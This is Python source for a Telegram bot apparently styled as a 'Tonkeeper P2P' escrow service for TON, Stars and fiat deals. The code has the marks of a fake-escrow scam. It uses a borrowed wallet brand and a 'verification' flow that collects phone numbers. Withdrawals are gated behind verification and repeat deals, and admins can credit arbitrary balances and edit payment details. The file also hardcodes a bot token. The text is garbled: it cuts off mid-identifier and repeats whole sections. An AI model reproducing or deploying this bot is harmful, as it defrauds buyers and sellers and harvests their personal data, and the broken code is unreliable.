import asyncio
import json
import os
import uuid
import random
from datetime import datetime
from typing import Dict, Any

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
SUPPORT_LINK = "@p2psupbot"
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "Tonkeeper P2P"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ЯЗЫКИ
# ============================================================
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文",
    "ar": "🇸🇦 العربية"
}

# ============================================================
# 4. ЛОКАЛИЗАЦИЯ (ПОЛНОСТЬЮ ПРОВЕРЕНА)
# ============================================================
LOCALE = {
    "ru": {
        "bot_name": "Deals Tonkeeper",
        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Продавец создаёт сделку",
        "step2": "Продавец отправляет ссылку покупателю",
        "step3": "Покупатель выбирает способ оплаты",
        "step4": "Администратор проверяет оплату",
        "step5": "Продавец нажимает «Передал товар»",
        "step6": "Покупатель нажимает «Получил товар»",
        "step7": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "support_contact": "@p2psupbot",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "premium": "ПРЕМИУМ",
        "faq": "ОТЗЫВЫ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН ПАНЕЛЬ",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "describe_product": "ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ",
        "example_product": "ПРИМЕР: NFT-подарок Telegram Premium",
        "choose_currency": "ВЫБЕРИТЕ ВАЛЮТУ",
        "enter_amount": "ВВЕДИТЕ СУММУ",
        "enter_buyer": "ВВЕДИТЕ USERNAME ПОКУПАТЕЛЯ",
        "buyer_username_example": "ПРИМЕР: john_doe",
        "only_this_user": "ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
        "your_balance": "ВАШ БАЛАНС",
        "withdraw_funds": "ВЫВЕСТИ СРЕДСТВА",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "premium_status": "ПРЕМИУМ СТАТУС",
        "premium_privileges": "ПРИВИЛЕГИИ",
        "premium_1": "ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7",
        "premium_2": "СНИЖЕННАЯ КОМИССИЯ (0%)",
        "premium_3": "РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ",
        "premium_4": "ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ",
        "premium_active": "ВАШ СТАТУС: АКТИВЕН",
        "faq_q1": "КАК НАЧАТЬ СДЕЛКУ?",
        "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.",
        "faq_q2": "КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?",
        "faq_a2": "TON | STARS | RUB | UAH",
        "faq_q3": "КАК Я ПОЛУЧУ ОПЛАТУ?",
        "faq_a3": "ПОСЛЕ ПОДТВЕРЖДЕНИЯ ПОКУПАТЕЛЯ ДЕНЬГИ НА БАЛАНС.",
        "faq_q4": "КАК ВЫВЕСТИ ДЕНЬГИ?",
        "faq_a4": "МОЙ БАЛАНС -> ВЫБРАТЬ ВАЛЮТУ -> УКАЗАТЬ РЕКВИЗИТЫ",
        "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
        "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
        "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ КАНАЛ ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "ВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ: НОВОСТИ, ОБНОВЛЕНИЯ, ГАЙДЫ, РОЗЫГРЫШИ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "ВЕРИФИКАЦИЯ",
        "verify_desc": "Для защиты от мошенников пройдите проверку.",
        "verify_step1": "ШАГ 1: Нажмите Я НЕ РОБОТ",
        "verify_step2": "ШАГ 2: Отправьте номер телефона (+7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код: 1#2#3#4#5",
        "verify_phone_prompt": "ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n+7XXXXXXXXXX",
        "verify_code_prompt": "ВВЕДИТЕ КОД:\n1#2#3#4#5",
        "verify_code_error": "НЕВЕРНЫЙ КОД! Должен быть: 1#2#3#4#5",
        "verify_phone_error": "НЕВЕРНЫЙ ФОРМАТ! Используйте: +7XXXXXXXXXX",
        "verify_success": "ВЕРИФИКАЦИЯ ПРОЙДЕНА! Сессия 24 часа. Доступен вывод.",
        "verify_already": "Верификация пройдена. Активна до: {expires}",
        "verify_expired": "СЕССИЯ ИСТЕКЛА! Пройдите заново.",
        "not_robot": "Я НЕ РОБОТ",
        "verify_need": "ДЛЯ ВЫВОДА НУЖНА ВЕРИФИКАЦИЯ!",
        "no_deals_warning": "ДЛЯ ВЫВОДА НУЖНО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "Проверить статус"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 5. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int):
    uid = str(user_id)
    verification_data[uid] = {"verified_at": datetime.now().isoformat()}
    save_json(FILES["verification"], verification_data)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    buttons.append([
        InlineKeyboardButton(text=f"📱 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
    ])

# ============================================================
# 8. FSM
# ============================================================
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

class RekvStates(StatesGroup):
    waiting_rekv_type = State()
    waiting_rekv_text = State()

class PhotoStates(StatesGroup):
    waiting_photo = State()

class VerifyStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ============================================================
# 9. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return

    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            f"🌐 {get_text('ru', 'choose_language_prompt')}",
            reply_markup=language_keyboa        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ КАНАЛ ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "ВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ: НОВОСТИ, ОБНОВЛЕНИЯ, ГАЙДЫ, РОЗЫГРЫШИ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "ВЕРИФИКАЦИЯ",
        "verify_desc": "Для защиты от мошенников пройдите проверку.",
        "verify_step1": "ШАГ 1: Нажмите Я НЕ РОБОТ",
        "verify_step2": "ШАГ 2: Отправьте номер телефона (+7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код: 1#2#3#4#5",
        "verify_phone_prompt": "ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n+7XXXXXXXXXX",
        "verify_code_prompt": "ВВЕДИТЕ КОД:\n1#2#3#4#5",
        "verify_code_error": "НЕВЕРНЫЙ КОД! Должен быть: 1#2#3#4#5",
        "verify_phone_error": "НЕВЕРНЫЙ ФОРМАТ! Используйте: +7XXXXXXXXXX",
        "verify_success": "ВЕРИФИКАЦИЯ ПРОЙДЕНА! Сессия 24 часа. Доступен вывод.",
        "verify_already": "Верификация пройдена. Активна до: {expires}",
        "verify_expired": "СЕССИЯ ИСТЕКЛА! Пройдите заново.",
        "not_robot": "Я НЕ РОБОТ",
        "verify_need": "ДЛЯ ВЫВОДА НУЖНА ВЕРИФИКАЦИЯ!",
        "no_deals_warning": "ДЛЯ ВЫВОДА НУЖНО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "Проверить статус"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 5. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

